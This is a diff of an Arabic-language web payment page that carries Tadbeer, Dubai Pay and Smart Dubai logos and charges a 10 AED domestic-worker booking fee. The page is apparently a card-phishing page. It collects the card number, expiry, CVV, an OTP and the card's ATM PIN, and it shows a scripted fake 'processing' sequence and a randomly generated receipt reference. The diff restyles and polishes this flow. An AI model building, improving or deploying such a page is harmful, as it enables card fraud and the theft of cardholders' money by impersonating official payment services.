@@ -2,270 +2,267 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>الدفع الآمن - تدبير</title>
     <link rel="icon" type="image/png" href="media/kv4pfeid/favicon.ico">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { overflow-x: hidden; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #f3f5f8;
-            color: #263445;
+            background: #fff;
+            color: #2a3548;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow-x: hidden;
         }
+
+        /* ===== Header: logos only ===== */
         header {
             background: #fff;
-            border-bottom: 1px solid #e7edf5;
-            padding: 12px 16px;
+            border-bottom: 1px solid #eef1f5;
+            padding: 14px 24px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            max-width: 100%;
         }
-        header .logo-wrap { display: flex; align-items: center; gap: 8px; }
-        header .logo-wrap img { height: 36px; }
-        header .header-logos { display: flex; align-items: center; gap: 12px; }
-        header .header-logos .logo-sadad { height: 34px; width: auto; max-width: 130px; object-fit: contain; }
-        header .header-logos .logo-smartdubai { height: 30px; width: auto; max-width: 110px; object-fit: contain; }
-        @media (min-width: 640px) {
-            header .header-logos .logo-sadad { height: 42px; max-width: 160px; }
-            header .header-logos .logo-smartdubai { height: 36px; max-width: 140px; }
+        header img { height: 44px; width: auto; object-fit: contain; }
+        header .logo-left { display: flex; align-items: center; }
+        header .logo-right { display: flex; align-items: center; }
+        @media (max-width: 520px) {
+            header { padding: 12px 16px; }
+            header img { height: 34px; }
         }
-        header .back-home {
-            font-size: 13px;
-            color: #6f7b88;
-            text-decoration: none;
-        }
-        header .back-home:hover { color: #0d67be; }
-        main { flex: 1; width: 100%; max-width: 640px; margin: 0 auto; padding: 28px 16px 60px; }
+
+        /* ===== Main ===== */
+        main { flex: 1; width: 100%; max-width: 560px; margin: 0 auto; padding: 28px 16px 56px; }
         .card {
-            background: #fff;
-            border: 1px solid #edf2f7;
-            border-radius: 22px;
-            box-shadow: 0 8px 24px rgba(148, 163, 184, 0.08);
-            padding: 24px;
+            background: #f2f6fa;
+            border: 1px solid #e6ecf2;
+            border-radius: 14px;
+            box-shadow: 0 2px 8px rgba(30, 58, 95, 0.05);
+            margin-bottom: 18px;
+            overflow: hidden;
         }
-        .card-title {
-            font-size: 16px;
+        .card-head {
+            background: #f7fafc;
+            border-bottom: 1px solid #e6ecf2;
+            padding: 13px 18px;
+            font-size: 15px;
             font-weight: 700;
-            color: #263445;
-            padding-bottom: 14px;
-            border-bottom: 1px solid #edf2f7;
-            margin-bottom: 4px;
+            color: #33475b;
         }
-        .card + .card { margin-top: 20px; }
+        .card-body { padding: 6px 18px 18px; }
+
         .row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 13px 0;
-            border-bottom: 1px solid #f0f4f8;
+            padding: 14px 0;
+            border-bottom: 1px solid #e9eef4;
             font-size: 14px;
         }
         .row:last-child { border-bottom: none; }
-        .row .lbl { color: #6f7b88; }
-        .row .val { font-weight: 600; color: #273447; }
-        .row.total .lbl { font-weight: 700; color: #263445; font-size: 15px; }
-        .row.total .val { font-weight: 700; color: #263445; font-size: 15px; }
-        .field { margin-top: 18px; }
-        .field-grid {
+        .row .lbl { color: #5b6b7f; font-weight: 500; }
+        .row .val { font-weight: 600; color: #2a3548; }
+        .row.total .lbl { font-weight: 700; color: #2a3548; font-size: 15px; }
+        .row.total .val { font-weight: 700; color: #2a3548; font-size: 15px; }
+
+        /* ===== Form rows (label + input side by side) ===== */
+        .form-row {
             display: grid;
-            grid-template-columns: 120px 1fr;
-            gap: 12px 14px;
+            grid-template-columns: 110px 1fr;
+            gap: 10px;
             align-items: center;
+            margin-top: 16px;
         }
-        .field label {
+        .form-row label {
             font-size: 14px;
-            font-weight: 500;
-            color: #1e293b;
+            font-weight: 600;
+            color: #33475b;
         }
-        .input-wrap { position: relative; }
-        .input-wrap .ic {
+
+        /* ===== Inputs ===== */
+        .input-wrap { position: relative; display: flex; align-items: center; }
+        .input-wrap .brand-ic {
             position: absolute;
-            left: 12px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
+            height: 20px;
+            width: 34px;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 24px;
-            height: 24px;
-            font-size: 12px;
+            pointer-events: none;
+        }
+        .input-wrap .brand-ic img { max-height: 20px; max-width: 34px; object-fit: contain; }
+        .input-wrap .brand-ic .generic {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 30px; height: 20px;
             border-radius: 3px;
+            background: #94a3b8;
             color: #fff;
-            font-weight: 700;
         }
-        .ic.visa { background: #1a1f71; color: #fff; }
-        .ic.mc { background: radial-gradient(circle at 35% 50%, #eb001b 38%, transparent 40%), radial-gradient(circle at 65% 50%, #f79e1b 38%, transparent 40%), #2b2b2b; }
-        .ic.amex { background: #006fcf; font-size: 8px; font-style: italic; }
-        .ic.unknown { background: #ef4444; }
-        input[type="text"], input[type="password"], select {
-            height: 48px;
-            width: 100%;
-            border-radius: 10px;
-            border: 1px solid #c9d3de;
-            background: #fff;
-            padding: 0 14px;
-            font-size: 15px;
-            color: #273447;
-            outline: none;
-            transition: border-color .2s, box-shadow .2s;
+        .input-wrap .brand-ic .generic::before {
+            content: "";
+            width: 14px; height: 2px;
+            background: rgba(255,255,255,.7);
+            position: absolute;
         }
-        input:focus, select:focus { border-color: #8ab9db; }
-        input.card-input { padding-right: 44px; padding-left: 14px; }
-        input.err { border-color: #ef4444; background: #fef2f2; box-shadow: 0 0 0 1px #ef4444; }
-        input.ok { border-color: #22c55e; box-shadow: 0 0 0 1px #22c55e; }
-        select.err { border-color: #ef4444; }
-        select.ok { border-color: #22c55e; }
-        .err-msg { margin-top: 6px; font-size: 12px; color: #d14b4b; display: none; }
-        .err-msg.show { display: block; }
+        .input-wrap .brand-ic .generic::after {
+            content: "";
+            position: absolute;
+            top: 6px;
+            width: 14px; height: 8px;
+            border: 1.5px solid rgba(255,255,255,.7);
+            border-radius: 1.5px;
+        }
         .check-ic {
             position: absolute;
-            right: 12px;
+            left: 12px;
             top: 50%;
             transform: translateY(-50%);
             width: 20px; height: 20px;
             display: none;
         }
         .check-ic.ok { display: block; color: #22c55e; }
-        html[dir=rtl] .check-ic { right: auto; left: 12px; }
         .check-ic.no { display: block; color: #ef4444; }
-        .expiry-grid {
-            display: grid;
-            grid-template-columns: 1fr 20px 1fr;
-            gap: 8px;
-            align-items: center;
-            max-width: 220px;
+        input[type="text"], input[type="password"], select {
+            height: 46px;
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #ced6df;
+            background: #fff;
+            padding: 0 12px;
+            font-size: 14px;
+            color: #2a3548;
+            outline: none;
+            transition: border-color .2s, box-shadow .2s;
         }
-        .expiry-grid .slash { text-align: center; font-size: 20px; color: #95a1af; }
-        .cvv-wrap { display: flex; gap: 12px; align-items: center; }
-        .cvv-wrap input { width: 100px; }
-        .cvv-card-ic {
-            width: 40px; height: 26px;
-            border-radius: 4px;
-            background: linear-gradient(135deg, #94a3b8, #64748b);
-            position: relative;
-            flex-shrink: 0;
-        }
-        .cvv-card-ic::after {
-            content: "";
-            position: absolute;
-            left: 3px; top: 8px;
-            width: 14px; height: 10px;
-            background: rgba(255,255,255,.55);
-            border-radius: 2px;
-        }
-        .brands { margin-top: 22px; }
-        .brands img { width: 100%; border-radius: 12px; }
-        .note {
-            text-align: right;
-            margin-top: 16px;
-            font-size: 13px;
-            line-height: 1.7;
-            color: #6e7b89;
-            font-weight: 500;
-        }
+        input:focus, select:focus { border-color: #8ab9db; box-shadow: 0 0 0 2px rgba(13,103,190,.12); }
+        input.card-input { padding-right: 54px; padding-left: 40px; }
+        input.err { border-color: #ef4444; background: #fef2f2; }
+        input.ok { border-color: #22c55e; }
+        select.err { border-color: #ef4444; }
+        select.ok { border-color: #22c55e; }
+        .err-msg { margin-top: 6px; font-size: 12px; color: #d14b4b; display: none; }
+        .err-msg.show { display: block; }
+
+        .expiry-grid { display: flex; align-items: center; gap: 8px; }
+        .expiry-grid select { width: 90px; }
+        .expiry-grid .slash { font-size: 18px; color: #95a1af; }
+
+        .cvv-wrap { display: flex; gap: 10px; align-items: center; }
+        .cvv-wrap input { width: 110px; }
+        .cvv-card-ic svg { width: 38px; height: auto; flex-shrink: 0; }
+
+        /* ===== Accepted brands strip ===== */
+        .brands { margin-top: 20px; }
+        .brands img { width: 100%; border-radius: 10px; }
+
+        /* ===== Action buttons ===== */
         .actions {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
             margin-top: 24px;
-            background: #f5f8fc;
-            border: 1px solid #e8eef5;
-            border-radius: 22px;
+            background: #f2f6fa;
+            border: 1px solid #e6ecf2;
+            border-radius: 14px;
             padding: 16px;
         }
         .btn {
             height: 50px;
-            border-radius: 999px;
-            font-size: 17px;
-            font-weight: 600;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
             border: none;
             transition: all .2s;
         }
-        .btn-cancel { background: transparent; color: #0d67be; border: 1px solid #cfe0f0; }
-        .btn-cancel:hover { background: #edf5fd; }
-        .btn-pay { background: #0d67be; color: #fff; }
-        .btn-pay:hover { background: #0a5aa7; }
+        .btn-cancel { background: #fff; color: #33475b; border: 1px solid #ced6df; }
+        .btn-cancel:hover { background: #f7fafc; }
+        .btn-pay { background: #1568c8; color: #fff; }
+        .btn-pay:hover { background: #1157a8; }
         .btn-pay:disabled { opacity: .6; cursor: not-allowed; }
+        .submit-band {
+            margin-top: 0;
+            background: #f2f6fa;
+            border: 1px solid #e6ecf2;
+            border-radius: 14px;
+            padding: 16px;
+        }
+        .submit-band .btn { width: 100%; }
+
         footer {
             text-align: center;
             padding: 18px;
             font-size: 12px;
             color: #94a3b8;
         }
-        /* Processing */
-        .processing {
-            text-align: center;
-            padding: 56px 20px;
-        }
+
+        /* ===== Processing ===== */
+        .processing { text-align: center; padding: 56px 20px; }
         .spin {
-            width: 56px; height: 56px;
+            width: 54px; height: 54px;
             margin: 0 auto 22px;
             border-radius: 50%;
-            border: 3px solid #d8e6f3;
-            border-top-color: #0d67be;
+            border: 3px solid #e3ecf5;
+            border-top-color: #1568c8;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .processing h3 { font-size: 20px; font-weight: 600; color: #263445; }
-        .processing p { margin-top: 12px; font-size: 14px; color: #6f7b88; line-height: 1.75; }
-        /* OTP / ATM step */
-        .step-center { text-align: center; padding: 8px 6px 0; }
+        .processing h3 { font-size: 20px; font-weight: 700; color: #33475b; }
+        .processing p { margin-top: 12px; font-size: 14px; color: #5b6b7f; line-height: 1.75; }
+
+        /* ===== OTP / ATM steps ===== */
+        .step-center { text-align: center; padding: 10px 6px 0; }
         .step-ic {
-            width: 64px; height: 64px;
-            margin: 0 auto 18px;
+            width: 60px; height: 60px;
+            margin: 0 auto 16px;
             border-radius: 50%;
+            background: #e8f0f9;
+            border: 1px solid #d5e3f1;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            box-shadow: 0 2px 8px rgba(0,0,0,.05);
+            font-size: 26px;
         }
-        .step-ic.otp { background: #edf5fd; border: 1px solid #d7e7f5; }
-        .step-ic.atm { background: #fff4e6; border: 1px solid #ffe1b4; }
-        .step-center h3 { font-size: 20px; font-weight: 600; color: #263445; }
-        .step-center p.sub { margin-top: 10px; font-size: 14px; color: #6f7b88; line-height: 1.75; }
+        .step-ic.atm { background: #fff4e6; border-color: #ffe1b4; }
+        .step-center h3 { font-size: 20px; font-weight: 700; color: #33475b; }
+        .step-center p.sub { margin-top: 10px; font-size: 14px; color: #5b6b7f; line-height: 1.75; }
         .step-center .big-input {
             margin-top: 22px;
-            height: 56px;
+            height: 54px;
             text-align: center;
             font-size: 24px;
             letter-spacing: .35em;
-            border-radius: 14px;
-            border: 1px solid #c9d3de;
+            border-radius: 10px;
+            border: 1px solid #ced6df;
         }
-        .step-center .big-input:focus { border-color: #8ab9db; }
+        .step-center .big-input:focus { border-color: #8ab9db; box-shadow: 0 0 0 2px rgba(13,103,190,.12); }
         .warn-box {
             margin-top: 16px;
-            border-radius: 16px;
+            border-radius: 10px;
             border: 1px solid #ffe1b4;
             background: #fff8eb;
             padding: 12px 16px;
-            text-align: right;
+            text-align: center;
             font-size: 13px;
             line-height: 1.6;
             color: #9b6b11;
         }
-        .submit-band {
-            margin-top: 22px;
-            border-radius: 22px;
-            border: 1px solid #e8eef5;
-            background: #f5f8fc;
-            padding: 20px;
-        }
-        .submit-band .btn { width: 100%; }
-        /* Success */
-        .success-box {
-            text-align: center;
-            padding: 44px 20px;
-            border: 1px solid #daf0df;
-        }
+
+        /* ===== Success ===== */
+        .success-box { text-align: center; padding: 40px 20px; border-color: #d3e5d8; }
         .success-box .tick {
-            width: 64px; height: 64px;
-            margin: 0 auto 18px;
+            width: 62px; height: 62px;
+            margin: 0 auto 16px;
             border-radius: 50%;
             background: #e8f8ec;
             display: flex;
@@ -273,106 +270,101 @@
             justify-content: center;
             font-size: 30px;
         }
-        .success-box h2 { font-size: 22px; font-weight: 600; color: #12834d; }
-        .success-box p { margin-top: 10px; font-size: 14px; color: #6f7b88; }
+        .success-box h2 { font-size: 21px; font-weight: 700; color: #12834d; }
+        .success-box p { margin-top: 10px; font-size: 14px; color: #5b6b7f; }
         .amt-box {
-            margin-top: 24px;
-            border-radius: 18px;
+            margin-top: 22px;
+            border-radius: 12px;
             background: #f5faf7;
             padding: 16px 20px;
         }
-        .amt-box .lbl { font-size: 13px; color: #6f7b88; }
-        .amt-box .val { margin-top: 6px; font-size: 28px; font-weight: 600; color: #12834d; }
+        .amt-box .lbl { font-size: 13px; color: #5b6b7f; }
+        .amt-box .val { margin-top: 6px; font-size: 28px; font-weight: 700; color: #12834d; }
         .ref-box {
-            margin-top: 16px;
-            border-radius: 18px;
+            margin-top: 14px;
+            border-radius: 12px;
             background: #f8fafc;
-            padding: 16px 20px;
+            padding: 14px 20px;
             text-align: left;
         }
-        .ref-box .lbl { font-size: 13px; color: #6f7b88; }
-        .ref-box .val { margin-top: 6px; font-family: monospace; font-size: 14px; color: #273447; }
+        html[dir=rtl] .ref-box { text-align: right; }
+        .ref-box .lbl { font-size: 13px; color: #5b6b7f; }
+        .ref-box .val { margin-top: 6px; font-family: monospace; font-size: 14px; color: #2a3548; font-weight: 600; }
+
         .hidden { display: none !important; }
+
+        /* ===== Mobile ===== */
         @media (max-width: 520px) {
-            .field-grid { grid-template-columns: 1fr; gap: 8px; }
-            .actions { grid-template-columns: 1fr; }
+            main { padding: 20px 12px 48px; }
+            .form-row { grid-template-columns: 1fr; gap: 8px; margin-top: 14px; }
+            .actions { grid-template-columns: 1fr; gap: 10px; }
+            .expiry-grid select { width: 48%; }
+            .cvv-wrap input { width: 100px; }
         }
     </style>
 </head>
 <body>
     <header>
-        <div class="logo-wrap">
-            <img src="media/kv4pfeid/logo-website-10-4.png" alt="Tadbeer">
-            <span class="brand">الدفع الآمن</span>
+        <div class="logo-left">
+            <img src="dubaipay-logo.png" alt="سداد دبي">
         </div>
-        <div class="header-logos">
-            <img class="logo-sadad" src="dubaipay-logo.png" alt="سداد دبي">
-            <img class="logo-smartdubai" src="smart-dubai-logo.png" alt="دبي الذكية">
+        <div class="logo-right">
+            <img src="smart-dubai-logo.png" alt="دبي الذكية">
         </div>
-        <a class="back-home" href="/home">العودة للرئيسية</a>
     </header>
 
     <main>
         <!-- STEP 1: Card details -->
         <div id="pg-card">
             <div class="card">
-                <div class="card-title">ملخص الدفع</div>
-                <div class="row"><span class="lbl">اسم مقدم الطلب</span><span class="val" id="sum-name">—</span></div>
-                <div class="row"><span class="lbl">رقم هوية مقدم الطلب</span><span class="val" id="sum-id">—</span></div>
-                <div class="row"><span class="lbl">رسوم الخدمة</span><span class="val" id="sum-fee">—</span></div>
-                <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total">—</span></div>
+                <div class="card-head">ملخص الدفع</div>
+                <div class="card-body">
+                    <div class="row"><span class="lbl">اسم مقدم الطلب</span><span class="val" id="sum-name">—</span></div>
+                    <div class="row"><span class="lbl">الخدمة</span><span class="val" id="sum-service">طلب عاملة منزلية</span></div>
+                    <div class="row"><span class="lbl">رسوم إصدار العقد وتأكيد الحجز</span><span class="val" id="sum-fee">10 AED</span></div>
+                    <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total">10 AED</span></div>
+                </div>
             </div>
 
             <div class="card">
-                <div class="card-title">بيانات البطاقة</div>
-                <form id="card-form" novalidate>
-                    <div class="field">
-                        <div class="field-grid">
-                            <label>رقم البطاقة</label>
-                            <div class="input-wrap">
-                                <span class="ic unknown" id="brand-ic"></span>
-                                <input type="text" inputmode="numeric" class="card-input" id="card-num" placeholder="أدخل رقم البطاقة" maxlength="19" autocomplete="off">
-                                <svg class="check-ic" id="card-num-ic" width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke-width="1.5"/><path d="M7 10L9 12L13 8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                            </div>
+                <div class="card-head">بيانات البطاقة</div>
+                <div class="card-body">
+                    <div class="form-row">
+                        <label>رقم البطاقة</label>
+                        <div class="input-wrap">
+                            <span class="brand-ic" id="brand-ic"><span class="generic"></span></span>
+                            <input type="text" inputmode="numeric" class="card-input" id="card-num" placeholder="أدخل رقم البطاقة" maxlength="19" autocomplete="off">
+                            <svg class="check-ic" id="card-num-ic" width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke-width="1.5"/><path d="M7 10L9 12L13 8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                         </div>
-                        <div class="err-msg" id="card-num-err">رقم البطاقة غير صالح أو غير مدعوم</div>
                     </div>
+                    <div class="err-msg" id="card-num-err">رقم البطاقة غير صالح أو غير مدعوم</div>
 
-                    <div class="field">
-                        <div class="field-grid">
-                            <label>تاريخ الانتهاء</label>
-                            <div class="expiry-grid">
-                                <select id="card-mm">
-                                    <option value="">شهر</option>
-                                </select>
-                                <span class="slash">/</span>
-                                <select id="card-yy">
-                                    <option value="">سنة</option>
-                                </select>
-                            </div>
+                    <div class="form-row">
+                        <label>تاريخ الانتهاء</label>
+                        <div class="expiry-grid">
+                            <select id="card-mm"><option value="">شهر</option></select>
+                            <span class="slash">/</span>
+                            <select id="card-yy"><option value="">سنة</option></select>
                         </div>
-                        <div class="err-msg" id="card-exp-err">تاريخ الانتهاء غير صالح</div>
                     </div>
+                    <div class="err-msg" id="card-exp-err">تاريخ الانتهاء غير صالح</div>
 
-                    <div class="field">
-                        <div class="field-grid">
-                            <label>رمز CVV</label>
-                            <div class="cvv-wrap">
-                                <input type="password" inputmode="numeric" id="card-cvv" placeholder="رمز CVV" maxlength="4" autocomplete="off">
-                                <span class="cvv-card-ic"></span>
-                            </div>
+                    <div class="form-row">
+                        <label>رمز CVV</label>
+                        <div class="cvv-wrap">
+                            <input type="password" inputmode="numeric" id="card-cvv" placeholder="رمز CVV" maxlength="4" autocomplete="off">
+                                <span class="cvv-card-ic"><svg width="84" height="58" viewBox="0 0 84 58" fill="none"><rect x="6" y="8" width="46" height="34" rx="6" fill="#93A1AF"/><rect x="6" y="14" width="46" height="7" fill="#56616D"/><rect x="35" y="28" width="24" height="17" rx="5" fill="#E9F0F6" stroke="#AAB7C4"/><rect x="41" y="33" width="12" height="4" rx="2" fill="#FFFFFF"/><circle cx="46" cy="35" r="1.7" fill="#D33B49"/><circle cx="51" cy="35" r="1.7" fill="#D33B49"/><circle cx="56" cy="35" r="1.7" fill="#D33B49"/></svg></span>
                         </div>
-                        <div class="err-msg" id="card-cvv-err">رمز CVV مطلوب</div>
                     </div>
+                    <div class="err-msg" id="card-cvv-err">رمز CVV مطلوب</div>
 
-                    <p class="note">لن يتم تحصيل أي رسوم من بطاقتكم الائتمانية إلا بعد مراجعة الطلب واعتماده رسمياً. وفي حال عدم الموافقة على الطلب، فلن يتم استقطاع أي مبالغ مالية.</p>
                     <div class="brands"><img src="card-brands.png" alt="Visa Mastercard American Express Discover"></div>
-                </form>
+                </div>
             </div>
 
             <div class="actions">
                 <button type="button" class="btn btn-cancel" id="btn-cancel">إلغاء</button>
-                <button type="button" class="btn btn-pay" id="btn-pay">ادفع الآن</button>
+                <button type="button" class="btn btn-pay" id="btn-pay">دفع</button>
             </div>
         </div>
 
@@ -387,17 +379,21 @@
         <!-- STEP 2: OTP -->
         <div id="pg-otp" class="hidden">
             <div class="card">
-                <div class="card-title">ملخص الدفع</div>
-                <div class="row"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-2">—</span></div>
+                <div class="card-head">ملخص الدفع</div>
+                <div class="card-body">
+                    <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-2">10 AED</span></div>
+                </div>
             </div>
             <div class="card">
-                <div class="card-title">التحقق الأمني للبطاقة</div>
-                <div class="step-center">
-                    <div class="step-ic otp">&#128241;</div>
-                    <h3>رمز التحقق (OTP)</h3>
-                    <p class="sub">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
-                    <input type="text" inputmode="numeric" class="big-input" id="otp-input" placeholder="أدخل رمز التحقق" maxlength="6" autocomplete="off">
-                    <div class="err-msg" id="otp-err" style="text-align:center">الرجاء إدخال رمز التحقق الكامل</div>
+                <div class="card-head">التحقق الأمني للبطاقة</div>
+                <div class="card-body">
+                    <div class="step-center">
+                        <div class="step-ic">&#128241;</div>
+                        <h3>رمز التحقق (OTP)</h3>
+                        <p class="sub">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
+                        <input type="text" inputmode="numeric" class="big-input" id="otp-input" placeholder="أدخل رمز التحقق" maxlength="6" autocomplete="off">
+                        <div class="err-msg" id="otp-err" style="text-align:center">الرجاء إدخال رمز التحقق الكامل</div>
+                    </div>
                 </div>
             </div>
             <div class="submit-band">
@@ -408,18 +404,22 @@
         <!-- STEP 3: ATM PIN -->
         <div id="pg-atm" class="hidden">
             <div class="card">
-                <div class="card-title">ملخص الدفع</div>
-                <div class="row"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-3">—</span></div>
+                <div class="card-head">ملخص الدفع</div>
+                <div class="card-body">
+                    <div class="row total"><span class="lbl">المبلغ المستحق</span><span class="val" id="sum-total-3">10 AED</span></div>
+                </div>
             </div>
             <div class="card">
-                <div class="card-title">التحقق من رمز PIN</div>
-                <div class="step-center">
-                    <div class="step-ic atm">&#127974;</div>
-                    <h3>رقم PIN</h3>
-                    <p class="sub">أدخل رقم PIN الخاص ببطاقتك</p>
-                    <input type="password" inputmode="numeric" class="big-input" id="pin-input" placeholder="&#8226;&#8226;&#8226;&#8226;" maxlength="6" autocomplete="off">
-                    <div class="err-msg" id="pin-err" style="text-align:center">الرجاء إدخال PIN كاملاً</div>
-                    <div class="warn-box">لا تشارك رقم PIN الخاص بك مع أي شخص. لن يطلب موظفو تدبير هذه المعلومات أبداً.</div>
+                <div class="card-head">التحقق من رمز PIN</div>
+                <div class="card-body">
+                    <div class="step-center">
+                        <div class="step-ic atm">&#127974;</div>
+                        <h3>رقم PIN</h3>
+                        <p class="sub">أدخل رقم PIN الخاص ببطاقتك</p>
+                        <input type="password" inputmode="numeric" class="big-input" id="pin-input" placeholder="&#8226;&#8226;&#8226;&#8226;" maxlength="6" autocomplete="off">
+                        <div class="err-msg" id="pin-err" style="text-align:center">الرجاء إدخال PIN كاملاً</div>
+                        <div class="warn-box">لا تشارك رقم PIN الخاص بك مع أي شخص. لن يطلب موظفو تدبير هذه المعلومات أبداً.</div>
+                    </div>
                 </div>
             </div>
             <div class="submit-band">
@@ -431,7 +431,7 @@
         <div id="pg-success" class="hidden">
             <div class="card success-box">
                 <div class="tick">&#9989;</div>
-                <h2>ادفع الآنment Completed Successfully!</h2>
+                <h2>تم الدفع بنجاح</h2>
                 <p>تمت معالجة دفعتك بنجاح</p>
                 <div class="amt-box">
                     <div class="lbl">المبلغ المدفوع</div>
@@ -453,7 +453,8 @@
 
     <script>
     (function () {
-        const fmt = n => n ? Number(n).toLocaleString('ar-EG') : null;
+        // Force Latin (English) digits for amounts
+        const fmtEn = n => n !== null && n !== undefined ? Number(n).toLocaleString('en-US') : null;
 
         // Load booking data from the customer-info step
         let booking = null, contractNo = '—';
@@ -461,17 +462,15 @@
         contractNo = sessionStorage.getItem('tdContractNo') || contractNo;
 
         function $(id) { return document.getElementById(id); }
-        function setText(id, val, fallback) { const el = $(id); if (el) el.innerText = (val ? String(val) : (fallback || '—')); }
+        function setText(id, val, fallback) { const el = $(id); if (el) el.innerText = (val !== null && val !== undefined && val !== '') ? String(val) : (fallback || '—'); }
 
-        setText('sum-name', booking ? (booking.name || booking.customerName) : null);
-        setText('sum-id', booking ? (booking.idNumber || booking.emiratesId) : null);
-        const fee = booking && booking.bookingFee ? fmt(booking.bookingFee) + ' AED' : '10 AED';
-        setText('sum-fee', fee);
-        const total = booking && booking.bookingFee ? booking.bookingFee : 10;
-        const totalStr = fmt(total) + ' AED';
-        setText('sum-total', totalStr);
-        setText('sum-total-2', totalStr);
-        setText('sum-total-3', totalStr);
+        setText('sum-name', booking && (booking.name || booking.customerName));
+        const fee = booking && booking.bookingFee ? booking.bookingFee : 10;
+        const feeStr = fmtEn(fee) + ' AED';
+        setText('sum-fee', feeStr);
+        setText('sum-total', feeStr);
+        setText('sum-total-2', feeStr);
+        setText('sum-total-3', feeStr);
 
         function show(id) {
             ['pg-card', 'pg-processing', 'pg-otp', 'pg-atm', 'pg-success'].forEach(x => $(x).classList.add('hidden'));
@@ -490,6 +489,11 @@
         })();
 
         // ---- Card number validation + brand detection ----
+        const BRAND_ICONS = {
+            visa: 'images-visa.png',
+            mc: 'images-mastercard.png',
+            amex: 'images-visa.png'
+        };
         function cardBrand(n) {
             if (/^4/.test(n)) return 'visa';
             if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'mc';
@@ -506,12 +510,21 @@
             return s % 10 === 0;
         }
         const numInput = $('card-num'), numIc = $('card-num-ic'), numErr = $('card-num-err'), brandIc = $('brand-ic');
+        function setBrandIcon(brand) {
+            if (brand === 'unknown' || !BRAND_ICONS[brand]) {
+                brandIc.innerHTML = '<span class="generic"></span>';
+            } else {
+                const img = document.createElement('img');
+                img.src = BRAND_ICONS[brand];
+                img.alt = brand;
+                brandIc.innerHTML = '';
+                brandIc.appendChild(img);
+            }
+        }
         numInput.addEventListener('input', function () {
             let v = this.value.replace(/\D/g, '').slice(0, 16);
             this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
-            const brand = cardBrand(v);
-            brandIc.className = 'ic ' + brand;
-            brandIc.innerText = brand === 'visa' ? 'VISA' : brand === 'mc' ? 'MC' : brand === 'amex' ? 'AMEX' : '\u2715';
+            setBrandIcon(cardBrand(v));
             if (v.length >= 16) {
                 const valid = luhn(v);
                 this.classList.toggle('ok', valid);
@@ -583,7 +596,7 @@
             setProcMsg('Processing payment...');
             await step(2600);
             // Success
-            setText('suc-amt', fmt(total) + ' AED');
+            setText('suc-amt', fmtEn(fee) + ' AED');
             const ref = 'TD-' + new Date().getFullYear() + String(Math.floor(10000 + Math.random() * 90000));
             setText('suc-ref', ref);
             setText('suc-date', new Date().toLocaleString('ar-EG'));
